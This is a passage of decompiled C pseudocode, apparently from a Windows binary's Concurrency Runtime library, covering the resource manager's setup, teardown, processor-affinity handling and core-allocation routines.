  *((_DWORD *)this + 23) = 0;
  v6 = 0;
  *((_DWORD *)this + 24) = 0;
  *((_DWORD *)this + 25) = 0;
  sub_47B990(this + 104);
  LOBYTE(v6) = 1;
  sub_4721FB(1);
  sub_4707F4((unsigned int)this);
  if ( dword_4F0BF4 < 3 )
  {
    v2 = VirtualAlloc(0, 0x1000u, 0x3000u, 4u);
    *((_DWORD *)this + 35) = v2;
    if ( !v2 )
    {
      sub_45ABA0(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
    *v2 = 1;
  }
  else
  {
    *((_DWORD *)this + 35) = 0;
  }
  *((_DWORD *)this + 20) = sub_46F509(0);
  *((_DWORD *)this + 21) = unknown_libname_28((unsigned __int64)*((unsigned int *)this + 3) >> 30 != 0 ? -1 : 4 * *((_DWORD *)this + 3));
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4C0998: using guessed type void *Concurrency::details::ResourceManager::`vftable';
// 4F0BF4: using guessed type int dword_4F0BF4;

//----- (0046FE57) --------------------------------------------------------
_DWORD *__thiscall sub_46FE57(_DWORD *this)
{
  _DWORD *result; // eax

  this[3] = 0;
  result = this;
  this[4] = 0;
  return result;
}

//----- (0046FE62) --------------------------------------------------------
char *__thiscall sub_46FE62(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_operation::`vftable';
  return this;
}
// 4C095C: using guessed type void *Concurrency::invalid_operation::`vftable';

//----- (0046FE8E) --------------------------------------------------------
char *__thiscall sub_46FE8E(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::unsupported_os::`vftable';
  return this;
}
// 4C0968: using guessed type void *Concurrency::unsupported_os::`vftable';

//----- (0046FEA9) --------------------------------------------------------
void __thiscall sub_46FEA9(void **this)
{
  sub_46C87D(this[9]);
}

//----- (0046FEB6) --------------------------------------------------------
void __thiscall sub_46FEB6(char *this)
{
  unsigned int v2; // edi
  int v3; // ebx
  Concurrency::details::GlobalCore *v4; // ecx
  Concurrency::details::GlobalCore *v5; // ecx
  void *v6; // eax

  v2 = 0;
  *(_DWORD *)this = &Concurrency::details::ResourceManager::`vftable';
  if ( *((_DWORD *)this + 6) )
  {
    v3 = 0;
    do
    {
      v4 = *(Concurrency::details::GlobalCore **)(*((_DWORD *)this + 18) + v3 + 32);
      if ( v4 )
        Concurrency::details::GlobalCore::`vector deleting destructor'(v4, 3u);
      ++v2;
      v3 += 40;
    }
    while ( v2 < *((_DWORD *)this + 6) );
  }
  v5 = (Concurrency::details::GlobalCore *)*((_DWORD *)this + 18);
  if ( v5 )
    Concurrency::details::GlobalCore::`vector deleting destructor'(v5, 3u);
  j_j_j___free_base(*((void **)this + 17));
  v6 = (void *)*((_DWORD *)this + 35);
  if ( v6 )
    VirtualFree(v6, 0, 0x8000u);
  CloseHandle(*((HANDLE *)this + 20));
  j_j_j___free_base(*((void **)this + 21));
  if ( *((_DWORD *)this + 19) )
  {
    sub_46F4FB(*((HANDLE *)this + 19));
    j_j_j___free_base(*((void **)this + 22));
    j_j_j___free_base(*((void **)this + 23));
  }
  sub_47B9C4((_DWORD *)this + 26);
  sub_46EDCA((LPCRITICAL_SECTION)(this + 44));
}
// 468E12: using guessed type void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int);
// 46FFC8: using guessed type void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int);
// 4C0998: using guessed type void *Concurrency::details::ResourceManager::`vftable';

//----- (0046FF89) --------------------------------------------------------
void __thiscall sub_46FF89(LPCRITICAL_SECTION *this)
{
  sub_46F193(*this);
}

//----- (0046FFBF) --------------------------------------------------------
_DWORD *__thiscall sub_46FFBF(_DWORD *this)
{
  _DWORD *result; // eax

  result = (_DWORD *)*this;
  *(_DWORD *)*this = 0;
  return result;
}

//----- (0047004E) --------------------------------------------------------
void **__thiscall sub_47004E(void **this, char a2)
{
  sub_46C87D(this[1]);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00470077) --------------------------------------------------------
int __thiscall sub_470077(_DWORD *this, int a2)
{
  int result; // eax

  result = this[1];
  if ( result )
  {
    *(_DWORD *)(a2 + 24) = *(_DWORD *)(result + 24);
    *(_DWORD *)(a2 + 28) = this[1];
    *(_DWORD *)(*(_DWORD *)(this[1] + 24) + 28) = a2;
    result = this[1];
    *(_DWORD *)(result + 24) = a2;
  }
  else
  {
    *(_DWORD *)(a2 + 24) = a2;
    *(_DWORD *)(a2 + 28) = a2;
  }
  ++*this;
  this[1] = a2;
  return result;
}

//----- (004700B0) --------------------------------------------------------
unsigned int __thiscall sub_4700B0(int *this, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // eax
  unsigned int v5; // esi
  unsigned int i; // esi
  int v7; // edx
  unsigned int v8; // esi
  _DWORD *v9; // edx

  v4 = a3;
  v5 = a2;
  if ( a2 >= a3 )
  {
    v8 = 0;
    if ( a4 )
    {
      do
      {
        v9 = *(_DWORD **)(this[23] + 4 * v8++);
        v9[1] = v9[9] - *(_DWORD *)(v9[4] + 160);
      }
      while ( v8 < a4 );
      return a3;
    }
    return v4;
  }
  else if ( a4 == 1 )
  {
    *(_DWORD *)(*(_DWORD *)this[23] + 4) = a2;
  }
  else
  {
    if ( a4 )
    {
      for ( i = 0; i < a4; ++i )
      {
        v7 = *(_DWORD *)(this[23] + 4 * i);
        *(double *)(v7 + 8) = (double)(unsigned int)(*(_DWORD *)(v7 + 36) - *(_DWORD *)(*(_DWORD *)(v7 + 16) + 160))
                            * ((double)a2
                             / (double)a3);
      }
      v5 = a2;
    }
    sub_4735A3(this[23], a4);
  }
  return v5;
}

//----- (00470180) --------------------------------------------------------
int __thiscall sub_470180(_DWORD *this, int a2)
{
  int result; // eax

  result = sub_471A63(this, *(_WORD *)(a2 + 4));
  if ( result )
  {
    result = *(_DWORD *)result;
    *(_DWORD *)a2 &= result;
  }
  else
  {
    *(_DWORD *)a2 = 0;
  }
  return result;
}

//----- (004701A3) --------------------------------------------------------
int __cdecl sub_4701A3(int *a1)
{
  int result; // eax
  int v2[3]; // [esp+8h] [ebp-Ch] BYREF

  memset(v2, 0, sizeof(v2));
  v2[0] = *a1;
  sub_4701CE(v2);
  result = v2[0];
  *a1 = v2[0];
  return result;
}

//----- (004701CE) --------------------------------------------------------
int __cdecl sub_4701CE(_DWORD *a1)
{
  int result; // eax
  _DWORD *v2; // ecx

  result = (int)a1;
  if ( *a1 )
  {
    v2 = (_DWORD *)dword_4F0BE0;
    if ( dword_4F0BE0 )
      return sub_470180(v2, (int)a1);
    v2 = (_DWORD *)dword_4F0BDC;
    if ( dword_4F0BDC )
      return sub_470180(v2, (int)a1);
  }
  return result;
}
// 4F0BDC: using guessed type int dword_4F0BDC;
// 4F0BE0: using guessed type int dword_4F0BE0;

//----- (004701F5) --------------------------------------------------------
int __thiscall sub_4701F5(DWORD_PTR *this, void *a2)
{
  return sub_46F834(a2, this);
}

//----- (00470207) --------------------------------------------------------
int sub_470207()
{
  HANDLE CurrentProcess; // eax
  int result; // eax
  HANDLE CurrentThread; // eax
  ULONG_PTR *v3; // esi
  __int16 v4; // cx
  ULONG_PTR v5; // edx
  int v6; // esi
  ULONG_PTR *v7; // eax
  ULONG_PTR *v8; // edx
  ULONG_PTR v9; // ecx
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-30h] BYREF
  ULONG_PTR *v12; // [esp+20h] [ebp-20h]
  int v13; // [esp+24h] [ebp-1Ch] BYREF
  __int16 v14; // [esp+28h] [ebp-18h]
  int v15; // [esp+3Ch] [ebp-4h]

  CurrentProcess = GetCurrentProcess();
  if ( !GetProcessAffinityMask(CurrentProcess, &ProcessAffinityMask, &SystemAffinityMask) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  result = ProcessAffinityMask;
  if ( ProcessAffinityMask != SystemAffinityMask )
  {
    if ( dword_4F0BF4 < 4 )
    {
      result = (int)operator new(8u);
      v6 = result;
      v12 = (ULONG_PTR *)result;
      v15 = 0;
      if ( result )
      {
        v7 = (ULONG_PTR *)operator new(0xCu);
        v8 = v7;
        v12 = v7;
        if ( v7 )
        {
          v9 = ProcessAffinityMask;
          *v7 = 0;
          v7[1] = 0;
          v7[2] = 0;
          *((_WORD *)v7 + 2) = 0;
          *v7 = v9;
        }
        else
        {
          v8 = 0;
        }
        *(_DWORD *)(v6 + 4) = v8;
        result = 1;
        *(_WORD *)v6 = 1;
      }
      else
      {
        v6 = 0;
      }
      dword_4F0BE0 = v6;
    }
    else
    {
      CurrentThread = GetCurrentThread();
      sub_46FD52(&v13, (int)CurrentThread);
      v3 = (ULONG_PTR *)operator new(0xCu);
      v12 = v3;
      if ( v3 )
      {
        v4 = v14;
        v5 = ProcessAffinityMask;
        *v3 = 0;
        v3[1] = 0;
        v3[2] = 0;
        *((_WORD *)v3 + 2) = v4;
        *v3 = v5;
      }
      else
      {
        v3 = 0;
      }
      result = (int)operator new(8u);
      v12 = (ULONG_PTR *)result;
      if ( result )
      {
        *(_DWORD *)(result + 4) = v3;
        *(_WORD *)result = 1;
      }
      else
      {
        result = 0;
      }
      dword_4F0BE0 = result;
    }
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4F0BE0: using guessed type int dword_4F0BE0;
// 4F0BF4: using guessed type int dword_4F0BF4;
// 470207: using guessed type _DWORD pExceptionObject[4];

//----- (0047032C) --------------------------------------------------------
void sub_47032C()
{
  j___free_base(Block);
  Block = 0;
  dword_4F0BF8 = 0;
}
// 4F0BF8: using guessed type int dword_4F0BF8;

//----- (00470347) --------------------------------------------------------
_DWORD *__thiscall sub_470347(_DWORD *this, int a2)
{
  unsigned int v3; // ecx
  _DWORD *result; // eax
  unsigned int *v5; // esi
  unsigned int v6; // edi
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // eax
  int v10; // ecx
  int v11; // edx
  bool v12; // zf
  int v13; // eax
  int v14; // [esp+4h] [ebp-1Ch]
  unsigned int v15; // [esp+8h] [ebp-18h]
  int v16; // [esp+Ch] [ebp-14h]
  _DWORD *v17; // [esp+10h] [ebp-10h]
  int v18; // [esp+14h] [ebp-Ch]
  int v19; // [esp+1Ch] [ebp-4h]

  v3 = 0;
  v15 = 0;
  result = *(_DWORD **)(a2 + 16);
  if ( this[6] )
  {
    v5 = result + 1;
    v14 = -4 - (_DWORD)result;
    do
    {
      v6 = 0;
      if ( *v5 )
      {
        v7 = 0;
        v19 = 0;
        do
        {
          v16 = 0;
          v8 = 1;
          result = (_DWORD *)(v7 + v5[11]);
          v18 = 1;
          v17 = result;
          if ( this[2] > 1u )
          {
            do
            {
              v9 = *(_DWORD **)(*(_DWORD *)(this[21] + 4 * v8) + 16);
              if ( v9[27] )
              {
                v10 = (int)v5 + v14 + v9[4];
                v11 = v19 + *(_DWORD *)(v10 + 48);
                if ( *(_DWORD *)v11 == 5 )
                {
                  if ( *v17 != 4 )
                  {
                    ++**(_DWORD **)(v11 + 20);
                    v13 = *(_DWORD *)(v10 + 48);
                    v7 = v19;
                    *(_DWORD *)(v19 + v13) = 4;
                    goto LABEL_16;
                  }
                  if ( v17[6] || *(_BYTE *)(v11 + 48) || v16 )
                  {
                    sub_47B568(v9, v10, v6);
                  }
                  else
                  {
                    ++**(_DWORD **)(v11 + 20);
                    v12 = *(_BYTE *)(v11 + 49) == 0;
                    *(_DWORD *)v11 = 4;
                    if ( v12 )
                      sub_47B789(v9, v10, v6);
                    v16 = 1;
                  }
                }
                v7 = v19;
              }
LABEL_16:
              result = (_DWORD *)(v18 + 1);
              v8 = (int)result;
              ++v18;
            }
            while ( (unsigned int)result < this[2] );
          }
          ++v6;
          v7 += 52;
          v19 = v7;
        }
        while ( v6 < *v5 );
        v3 = v15;
      }
      ++v3;
      v5 += 13;
      v15 = v3;
    }
    while ( v3 < this[6] );
  }
  return result;
}

//----- (00470454) --------------------------------------------------------
unsigned int __thiscall sub_470454(_DWORD *this)
{
  unsigned int v2; // esi

  v2 = this[47];
  if ( v2 >= sub_4707A1(this) + 1 )
    return sub_4707A1(this) + 1;
  return v2;
}

//----- (00470477) --------------------------------------------------------
unsigned int __thiscall sub_470477(_DWORD *this)
{
  int v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // edx

  v2 = this[46];
  v3 = sub_472427(this);
  v4 = this[47];
  if ( v4 >= v2 + v3 + 1 )
    return sub_472427(this) + v2 + 1;
  return v4;
}

//----- (004704A4) --------------------------------------------------------
unsigned int *__thiscall sub_4704A4(unsigned int *this)
{
  unsigned int *v1; // esi
  unsigned int *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // ebx
  unsigned int v5; // edi
  void *v6; // esi
  size_t v7; // eax
  int v8; // edx
  int v9; // edi
  _DWORD *v10; // esi
  _DWORD *v11; // edi
  int v12; // ecx
  unsigned int *v14; // [esp+18h] [ebp-28h]
  _DWORD *v16; // [esp+20h] [ebp-20h]
  int v17; // [esp+24h] [ebp-1Ch]
  unsigned int v18; // [esp+28h] [ebp-18h]
  int v19; // [esp+2Ch] [ebp-14h]
  unsigned int v20; // [esp+30h] [ebp-10h]

  v1 = this;
  v2 = (unsigned int *)unknown_libname_28((52 * (unsigned __int64)this[6]) >> 32 != 0 ? -1 : 52 * this[6]);
  v14 = v2;
  memset(v2, 0, 52 * v1[6]);
  v18 = 0;
  if ( v1[6] )
  {
    v3 = 0;
    v4 = v2 + 1;
    v17 = 0;
    do
    {
      v16 = (_DWORD *)(v3 + v1[18]);
      qmemcpy(v4 - 1, v16, 0x18u);
      v5 = *v4;
      v6 = (void *)unknown_libname_28((52 * (unsigned __int64)*v4) >> 32 != 0 ? -1 : 52 * *v4);
      if ( v6 )
        `vector constructor iterator'(v6, 0x34u, v5, (void *(__thiscall *)(void *))sub_46FE57);
      else
        v6 = 0;
      v7 = 52 * *v4;
      v4[11] = (unsigned int)v6;
      memset(v6, 0, v7);
      v20 = 0;
      if ( *v4 )
      {
        v8 = 0;
        v9 = 0;
        v19 = 0;
        do
        {
          v10 = (_DWORD *)(v9 + v16[8]);
          v11 = (_DWORD *)(v8 + v4[11]);
          *v11 = *v10++;
          *++v11 = *v10;
          v11[1] = v10[1];
          *(_DWORD *)(v8 + v4[11]) = 1;
          v12 = v19 + v16[8] + 16;
          v9 = v19 + 36;
          v19 += 36;
          *(_DWORD *)(v8 + v4[11] + 20) = v12;
          v8 += 52;
          ++v20;
        }
        while ( v20 < *v4 );
      }
      v4 += 13;
      v1 = this;
      v3 = v17 + 40;
      ++v18;
      v17 += 40;
    }
    while ( v18 < this[6] );
    return v14;
  }
  return v2;
}
// 468E98: using guessed type void __stdcall `vector constructor iterator'(void *, unsigned int, unsigned int, void *(__thiscall *)(void *));
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (004705DB) --------------------------------------------------------
BOOL __thiscall sub_4705DB(_DWORD *this)
{
  void *v2; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  v2 = (void *)sub_46FAA2(0, 0x10000u, (DWORD (__stdcall *)(LPVOID))sub_4713E1, this, 0, 0);
  this[19] = v2;
  if ( !v2 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return sub_46F878(v2, 15);
}
// 4705DB: using guessed type _DWORD pExceptionObject[4];

//----- (00470642) --------------------------------------------------------
char *__thiscall sub_470642(void *this, int a2)
{
  char *v3; // esi
  char *v4; // eax
  void *v6[3]; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a2 + 8))(a2, v6);
  v3 = 0;
  v7 = 0;
  v4 = (char *)operator new(0xD0u);
  LOBYTE(v7) = 1;
  if ( v4 )
    v3 = sub_47A67B(v4, a2, (int)this, v6);
  sub_479ADB(v6);
  return v3;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004706A4) --------------------------------------------------------
char *sub_4706A4()
{
  char *v0; // esi
  char *v1; // eax

  sub_46FC8F(&dword_4F0C34);
  if ( !dword_4F0BD0 || (v0 = (char *)sub_46F9E3(dword_4F0BD0), !sub_47375B((volatile signed __int32 *)v0)) )
  {
    v1 = (char *)operator new(0x90u);
    if ( v1 )
      v0 = sub_46FD73(v1);
    else
      v0 = 0;
    _InterlockedIncrement((volatile signed __int32 *)v0 + 1);
    dword_4F0BD0 = sub_46F9E3((int)v0);
  }
  dword_4F0C34 = 0;
  return v0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4F0BD0: using guessed type int dword_4F0BD0;
// 4F0C34: using guessed type int dword_4F0C34;

//----- (00470737) --------------------------------------------------------
int __thiscall sub_470737(int this, int a2, int a3)
{
  int v4; // edi
  int v5; // ecx
  int v6; // ecx

  v4 = 0;
  sub_46F04D((LPCRITICAL_SECTION)(this + 44));
  v5 = *(_DWORD *)(this + 100);
  if ( v5 )
    v6 = *(_DWORD *)(v5 + 24);
  else
    v6 = 0;
  while ( v6 )
  {
    v4 += *(_DWORD *)(52 * a3 + *(_DWORD *)(52 * a2 + *(_DWORD *)(v6 + 16) + 48) + 24);
    if ( v6 == *(_DWORD *)(this + 100) )
      v6 = 0;
    else
      v6 = *(_DWORD *)(v6 + 24);
  }
  sub_46F193((LPCRITICAL_SECTION)(this + 44));
  return v4;
}

//----- (004707A1) --------------------------------------------------------
unsigned int __thiscall sub_4707A1(_DWORD *this)
{
  unsigned int result; // eax

  result = this[47];
  if ( result >= this[32] + this[46] )
    return this[32] + this[46];
  return result;
}

//----- (004707BA) --------------------------------------------------------
void __thiscall sub_4707BA(_DWORD *this, void **Block)
{
  void **v2; // ebx
  unsigned int v3; // esi
  void **v4; // edi

  v2 = Block;
  v3 = 0;
  if ( this[6] )
  {
    v4 = Block + 12;
    do
    {
      j_j_j___free_base(*v4);
      ++v3;
      v4 += 13;
    }
    while ( v3 < this[6] );
    v2 = Block;
  }
  j_j_j___free_base(v2);
}

//----- (004707F4) --------------------------------------------------------
void __thiscall sub_4707F4(unsigned int this)
{
  void *v2; // eax
  size_t v3; // ecx
  unsigned int v4; // esi
  int v5; // ecx
  unsigned int *v6; // eax
  void *v7; // ecx
  size_t v8; // eax
  unsigned __int16 *v9; // ebx
  unsigned int v10; // ecx
  int v11; // edx
  int v12; // ecx
  char *v13; // esi
  int v14; // eax
  int v15; // esi
  int v16; // esi
  _DWORD *v17; // edx
  int v18; // ecx
  unsigned int *v19; // esi
  unsigned int v20; // esi
  unsigned int v21; // ecx
  unsigned __int16 v22; // dx
  int v23; // ebx
  unsigned int *v24; // ecx
  unsigned int v25; // eax
  unsigned int v26; // esi
  int v27; // ecx
  unsigned int v28; // edx
  _DWORD *v29; // ebx
  int v30; // [esp+Ch] [ebp-14h]
  unsigned int v31; // [esp+Ch] [ebp-14h]
  int v32; // [esp+10h] [ebp-10h]
  int v33; // [esp+10h] [ebp-10h]
  int v34; // [esp+14h] [ebp-Ch]
  unsigned int v35; // [esp+18h] [ebp-8h]
  int v36; // [esp+18h] [ebp-8h]
  int v37; // [esp+1Ch] [ebp-4h]
  unsigned int v38; // [esp+1Ch] [ebp-4h]

  *(_DWORD *)(this + 20) = dword_4F0BF0;
  *(_DWORD *)(this + 24) = dword_4F0BEC;
  *(_DWORD *)(this + 28) = dword_4F0BE4;
  v2 = (void *)unknown_libname_28((12 * (unsigned __int64)*(unsigned int *)(this + 20)) >> 32 != 0 ? -1 : 12 * *(_DWORD *)(this + 20));
  v3 = 12 * *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 68) = v2;
  memset(v2, 0, v3);
  v4 = *(_DWORD *)(this + 24);
  v5 = (40 * (unsigned __int64)v4) >> 32 != 0 ? -1 : 40 * v4;
  v6 = (unsigned int *)unknown_libname_28(__CFADD__(v5, 4) ? -1 : v5 + 4);
  if ( v6 )
  {
    *v6 = v4;
    v7 = v6 + 1;
  }
  else
  {
    v7 = 0;
  }
  v8 = 40 * *(_DWORD *)(this + 24);
  *(_DWORD *)(this + 72) = v7;
  memset(v7, 0, v8);
  if ( dword_4F0BF4 >= 4 )
  {
    v9 = (unsigned __int16 *)Block;
    v10 = 0;
    v11 = 0;
    v35 = 0;
    v37 = 0;
    if ( dword_4F0BF8 )
    {
      v32 = 0;
      while ( 1 )
      {
        if ( *(_DWORD *)v9 == 1 )
        {
          if ( !byte_4F0BE8 && *((_DWORD *)v9 + 8) )
          {
            v15 = 40 * v11;
            sub_472026(
              (unsigned int *)(40 * v11 + *(_DWORD *)(this + 72)),
              this,
              v11,
              v9[18],
              *((_DWORD *)v9 + 8),
              0,
              0);
            ++v37;
            *(_DWORD *)(v15 + *(_DWORD *)(this + 72) + 20) = *((_DWORD *)v9 + 2);
            v10 = v35;
          }
          v16 = *((_DWORD *)v9 + 8);
          if ( !v16 )
            goto LABEL_21;
          v17 = (_DWORD *)(v32 + *(_DWORD *)(this + 68));
          v18 = v9[18];
          v32 += 12;
          v17[2] = *((_DWORD *)v9 + 2);
          v17[1] = v18;
          *v17 = v16;
        }
        else
        {
          if ( *(_DWORD *)v9 != 3 || !byte_4F0BE8 )
            goto LABEL_21;
          v12 = 0;
          v13 = (char *)(v9 + 16);
          v14 = 40 * v11;
          v30 = 0;
          v34 = 40 * v11;
          do
          {
            if ( *(_DWORD *)v13 )
            {
              sub_472026(
                (unsigned int *)(v14 + *(_DWORD *)(this + 72)),
                this,
                v11,
                *((_WORD *)v13 + 2),
                *(_DWORD *)v13,
                0,
                0);
              v12 = v30;
              LOWORD(v11) = v37 + 1;
              v34 += 40;
              ++v37;
            }
            ++v12;
            v13 += 12;
            v30 = v12;
            v14 = v34;
          }
          while ( v12 < v9[15] );
        }
        v10 = v35;
LABEL_21:
        v10 += *((_DWORD *)v9 + 1);
        v9 = (unsigned __int16 *)((char *)v9 + *((_DWORD *)v9 + 1));
        v11 = v37;
        v35 = v10;
        if ( v10 >= dword_4F0BF8 )
          goto LABEL_42;
      }
    }
    goto LABEL_42;
  }
  v19 = (unsigned int *)Block;
  if ( Block )
  {
    v21 = 0;
    v22 = 0;
    v38 = 0;
    v36 = 0;
    if ( !dword_4F0BF8 )
    {
LABEL_42:
      sub_47032C();
      goto LABEL_43;
    }
    v33 = 0;
    v23 = 0;
    while ( 1 )
    {
      if ( v19[1] != 1 )
      {
        if ( v19[1] != 3 || !byte_4F0BE8 || !*v19 )
          goto LABEL_41;
        sub_472026((unsigned int *)(v23 + *(_DWORD *)(this + 72)), this, v22, 0, *v19, 0, 0);
        v22 = v36 + 1;
        v23 += 40;
        ++v36;
        goto LABEL_40;
      }
      if ( !byte_4F0BE8 )
      {
        if ( !*v19 )
          goto LABEL_41;
        sub_472026((unsigned int *)(v23 + *(_DWORD *)(this + 72)), this, v22, 0, *v19, 0, 0);
        v22 = ++v36;
        *(_DWORD *)(v23 + *(_DWORD *)(this + 72) + 20) = v19[2];
        v23 += 40;
        v21 = v38;
      }
      v31 = *v19;
      if ( *v19 )
      {
        v24 = (unsigned int *)(v33 + *(_DWORD *)(this + 68));
        v25 = v19[2];
        v24[1] = 0;
        v33 += 12;
        v24[2] = v25;
        *v24 = v31;
LABEL_40:
        v21 = v38;
      }
LABEL_41:
      v21 += 24;
      v19 += 6;
      v38 = v21;
      if ( v21 >= dword_4F0BF8 )
        goto LABEL_42;
    }
  }
  if ( dword_4F0BDC )
    v20 = *(_DWORD *)sub_471A63((_DWORD *)dword_4F0BDC, (__int16)Block);
  else
    v20 = ProcessAffinityMask;
  sub_472026(*(unsigned int **)(this + 72), this, 0, 0, v20, 0, 0);
  **(_DWORD **)(this + 68) = v20;
LABEL_43:
  if ( byte_4F0BE8 )
  {
    v26 = 0;
    if ( *(_DWORD *)(this + 24) )
    {
      v27 = 0;
      do
      {
        v28 = 0;
        if ( *(_DWORD *)(this + 20) )
        {
          v29 = *(_DWORD **)(this + 68);
          while ( *(_DWORD *)(v27 + *(_DWORD *)(this + 72) + 12) != v29[1]
               || (*(_DWORD *)(v27 + *(_DWORD *)(this + 72)) & *v29) == 0 )
          {
            ++v28;
            v29 += 3;
            if ( v28 >= *(_DWORD *)(this + 20) )
              goto LABEL_53;
          }
          *(_DWORD *)(v27 + *(_DWORD *)(this + 72) + 20) = *(_DWORD *)(12 * v28 + *(_DWORD *)(this + 68) + 8);
        }
LABEL_53:
        ++v26;
        v27 += 40;
      }
      while ( v26 < *(_DWORD *)(this + 24) );
    }
  }
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4F0BDC: using guessed type int dword_4F0BDC;
// 4F0BE4: using guessed type int dword_4F0BE4;
// 4F0BE8: using guessed type char byte_4F0BE8;
// 4F0BEC: using guessed type int dword_4F0BEC;
// 4F0BF0: using guessed type int dword_4F0BF0;
// 4F0BF4: using guessed type int dword_4F0BF4;
// 4F0BF8: using guessed type int dword_4F0BF8;

//----- (00470B06) --------------------------------------------------------
_DWORD *__thiscall sub_470B06(_DWORD *this)
{
  _DWORD *result; // eax
  int v2; // ebx
  _DWORD *v3; // ebx
  int v4; // eax
  int v5; // edi
  int v7; // [esp+8h] [ebp-Ch] BYREF
  int v8; // [esp+Ch] [ebp-8h] BYREF
  int v9; // [esp+10h] [ebp-4h] BYREF

  result = this;
  v2 = this[25];
  if ( v2 )
    v3 = *(_DWORD **)(v2 + 24);
  else
    v3 = 0;
  while ( v3 )
  {
    v4 = v3[30];
    v5 = v3[2];
    v7 = 0;
    v8 = 0;
    v9 = v4;
    (*(void (__thiscall **)(int, int *, int *, int *))(*(_DWORD *)v5 + 4))(v5, &v7, &v8, &v9);
    v3[30] = v9;
    result = this;
    if ( v3 == (_DWORD *)this[25] )
      v3 = 0;
    else
      v3 = (_DWORD *)v3[6];
  }
  return result;
}

//----- (00470B71) --------------------------------------------------------
bool __thiscall sub_470B71(_DWORD *this)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // esi
  unsigned int v3; // eax
  unsigned int v4; // eax
  unsigned int v5; // edi
  bool v6; // dl
  unsigned int v7; // ecx
  unsigned int v8; // edx
  unsigned int v9; // ebx
  int v10; // ecx
  bool v11; // zf
  int v12; // edi
  unsigned int v13; // ebx
  int v14; // ecx
  int v15; // eax
  int v17; // [esp+4h] [ebp-28h]
  _DWORD *v18; // [esp+8h] [ebp-24h]
  unsigned int v20; // [esp+14h] [ebp-18h]
  int v21; // [esp+18h] [ebp-14h]
  unsigned int v22; // [esp+1Ch] [ebp-10h]
  int v23; // [esp+1Ch] [ebp-10h]
  unsigned int v24; // [esp+20h] [ebp-Ch]
  int v25; // [esp+24h] [ebp-8h]
  bool v26; // [esp+2Bh] [ebp-1h]

  v1 = this;
  if ( !this[25] )
    return 1;
  v2 = *(_DWORD **)(this[25] + 24);
  v18 = v2;
  if ( v2[40] < sub_4707A1(v2) || v2[42] )
  {
    v3 = sub_4707A1(v2);
    v24 = sub_47AB43(v2, v3) - v2[40];
    v21 = v2[4];
    v25 = v2[5];
    v4 = sub_4707A1(v2);
    v5 = v1[6];
    v6 = v4 != v1[7];
    v7 = 0;
    v20 = 0;
    if ( v5 )
    {
      while ( 1 )
      {
        v26 = v24 != 0 && v6;
        if ( v26 )
        {
          v8 = v7 + 1;
          v17 = *(_DWORD *)(v25 + 4 * v7);
          if ( v7 + 1 < v5 )
          {
            v9 = v7;
            v10 = v21 + 52 * v17;
            do
            {
              if ( *(_DWORD *)(v21 + 52 * *(_DWORD *)(v25 + 4 * v8) + 28) > *(_DWORD *)(v10 + 28) )
              {
                v10 = v21 + 52 * *(_DWORD *)(v25 + 4 * v8);
                v9 = v8;
              }
              ++v8;
            }
            while ( v8 < v5 );
            v7 = v20;
            v11 = v20 == v9;
            v2 = v18;
            v22 = v9;
            v1 = this;
            if ( !v11 )
            {
              *(_DWORD *)(v25 + 4 * v20) = *(_DWORD *)(v25 + 4 * v22);
              *(_DWORD *)(v25 + 4 * v22) = v17;
            }
          }
        }
        v12 = v21 + 52 * *(_DWORD *)(v25 + 4 * v7);
        if ( *(_DWORD *)(v12 + 4) )
          break;
LABEL_23:
        v5 = v1[6];
        ++v7;
        v6 = v26;
        v20 = v7;
        if ( v7 >= v5 )
          goto LABEL_24;
      }
      v13 = 0;
      v14 = 0;
      v23 = 0;
      while ( 1 )
      {
        v15 = *(_DWORD *)(v12 + 48);
        if ( *(_DWORD *)(v15 + v14) == 1 )
        {
          if ( v24 )
          {
            ++**(_DWORD **)(v15 + v14 + 20);
            sub_47A934(v2, v12, v13, 0);
            --v24;
LABEL_20:
            v14 = v23;
          }
        }
        else if ( *(_BYTE *)(v15 + v14 + 49) )
        {
          sub_47B789(v2, v12, v13);
          goto LABEL_20;
        }
        ++v13;
        v14 += 52;
        v23 = v14;
        if ( v13 >= *(_DWORD *)(v12 + 4) )
        {
          v1 = this;
          v7 = v20;
          goto LABEL_23;
        }
      }
    }
  }
LABEL_24:
  if ( v2[33] == v2[32] )
    sub_47377A(v1, 0);
  return v2[40] == sub_4707A1(v2);
}

//----- (00470D0A) --------------------------------------------------------
